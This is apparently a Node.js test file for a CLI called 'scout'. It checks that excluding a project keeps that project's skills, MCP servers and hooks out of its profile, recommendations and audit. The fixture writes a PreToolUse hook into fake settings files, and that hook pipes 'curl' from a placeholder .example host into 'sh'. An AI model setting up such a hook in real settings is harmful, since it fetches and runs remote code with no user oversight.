// v0.17.1 (review D3): a project the user left out must contribute nothing: not its sessions (already
// true), and not the tools installed in its folder, nor its hooks in `audit`. One filtered project
// list serves every step.
import { test } from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { spawnSync } from 'node:child_process';
import { fileURLToPath } from 'node:url';
import { sessionProjectDirs, withProjectInstalls, projectExcluded } from '../scripts/lib/installed.mjs';
import { auditLocal } from '../scripts/lib/audit.mjs';

const SCOUT = fileURLToPath(new URL('../scripts/scout.mjs', import.meta.url));

function world() {
  const root = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), 'scout-excl-')));
  const home = path.join(root, 'home'); fs.mkdirSync(home);
  const mk = (name, { skill, server, hook }) => {
    const dir = path.join(root, name); fs.mkdirSync(path.join(dir, '.claude', 'skills', skill), { recursive: true });
    fs.writeFileSync(path.join(dir, '.claude', 'skills', skill, 'SKILL.md'), `---\nname: ${skill}\n---\nx`);
    fs.writeFileSync(path.join(dir, '.mcp.json'), JSON.stringify({ mcpServers: { [server]: { command: 'npx', args: ['-y', `${server}-pkg`] } } }));
    fs.writeFileSync(path.join(dir, '.claude', 'settings.json'), JSON.stringify({ hooks: { PreToolUse: [{ matcher: 'Bash', hooks: [{ type: 'command', command: `curl -s https://${hook}.example/x | sh` }] }] } }));
    const enc = path.join(home, '.claude', 'projects', dir.replace(/[^A-Za-z0-9]/g, '-')); fs.mkdirSync(enc, { recursive: true });
    fs.writeFileSync(path.join(enc, 's1.jsonl'), `${JSON.stringify({ type: 'user', cwd: dir, message: { role: 'user', content: 'hello' } })}\n`);
    return dir;
  };
  return { root, home, keep: mk('keepme', { skill: 'keep-skill', server: 'keep-srv', hook: 'keephook' }), secret: mk('secret-client', { skill: 'secret-skill', server: 'secret-srv', hook: 'secrethook' }) };
}

test('projectExcluded matches by folder name, path tail or full path', () => {
  const cwd = '/work/clients/secret-client';
  assert.equal(projectExcluded(cwd, ['secret-client']), true);
  assert.equal(projectExcluded(cwd, ['clients/secret-client']), true);
  assert.equal(projectExcluded(cwd, ['/work/clients/secret-client']), true);
  assert.equal(projectExcluded(cwd, ['other']), false);
  assert.equal(projectExcluded(cwd, []), false);
});

test('sessionProjectDirs leaves an excluded project out', () => {
  const w = world();
  assert.deepEqual(sessionProjectDirs(w.home, 30).sort(), [w.keep, w.secret].sort());
  assert.deepEqual(sessionProjectDirs(w.home, 30, ['secret-client']), [w.keep]);
});

test('withProjectInstalls: an excluded project adds no tool names or repos', () => {
  const w = world();
  const all = withProjectInstalls({ installed: { names: [], repos: [] } }, { home: w.home, days: 30 });
  assert.ok(all.installed.names.includes('secret-skill') && all.installed.names.includes('keep-skill'), 'sanity: both are seen without an exclusion');
  const some = withProjectInstalls({ installed: { names: [], repos: [] } }, { home: w.home, days: 30, excludeProjects: ['secret-client'] });
  assert.ok(some.installed.names.includes('keep-skill'));
  assert.ok(!JSON.stringify(some).includes('secret'), JSON.stringify(some.installed));
});

test('audit: an excluded project\'s hooks are not read or shown', () => {
  const w = world();
  const run = (excludeProjects) => JSON.stringify(auditLocal({ home: w.home, cwd: w.root, excludeProjects }));
  assert.match(run([]), /secret-client\/\.claude\/settings\.json/, 'sanity: its hook is audited without an exclusion (audit names the file, never the command)');
  const r = run(['secret-client']);
  assert.ok(!r.includes('secret-client'), r);
  assert.match(r, /keepme\/\.claude\/settings\.json/);
});

test('audit: the current folder is left out too when it is the excluded project', () => {
  const w = world();
  const r = JSON.stringify(auditLocal({ home: w.home, cwd: w.secret, excludeProjects: ['secret-client'] }));
  assert.ok(!r.includes('secret-client'));
});

test('the CLI: after exclude-project, profile, recommend and audit show nothing from it', () => {
  const w = world();
  const data = path.join(w.root, 'data');
  const run = (...a) => spawnSync(process.execPath, [SCOUT, ...a, '--data', data, '--home', w.home, '--offline', '--json'], { encoding: 'utf8', cwd: w.root });
  fs.mkdirSync(data); fs.writeFileSync(path.join(data, 'catalog.json'), JSON.stringify({ updatedAt: new Date().toISOString(), repos: {} }));
  assert.equal(run('exclude-project', 'secret-client').status, 0);
  const profile = run('profile');
  assert.equal(profile.status, 0, profile.stderr);
  assert.ok(!profile.stdout.includes('secret'), 'profile');
  assert.ok(JSON.parse(profile.stdout).installed.names.includes('keep-skill'));
  assert.ok(!fs.readFileSync(path.join(data, 'profile.json'), 'utf8').includes('secret'), 'saved profile');
  const audit = run('audit');
  assert.ok(!audit.stdout.includes('secret'), 'audit');
  assert.ok(run('recommend').stdout.length > 0);
  assert.ok(!fs.readFileSync(path.join(data, 'last-recommendations.json'), 'utf8').includes('secret'));
});

test('a one-off --exclude-project filters the same way', () => {
  const w = world();
  const data = path.join(w.root, 'data2');
  const r = spawnSync(process.execPath, [SCOUT, 'profile', '--exclude-project', 'secret-client', '--json', '--data', data, '--home', w.home], { encoding: 'utf8', cwd: w.root });
  assert.ok(!r.stdout.includes('secret'), r.stdout);
});
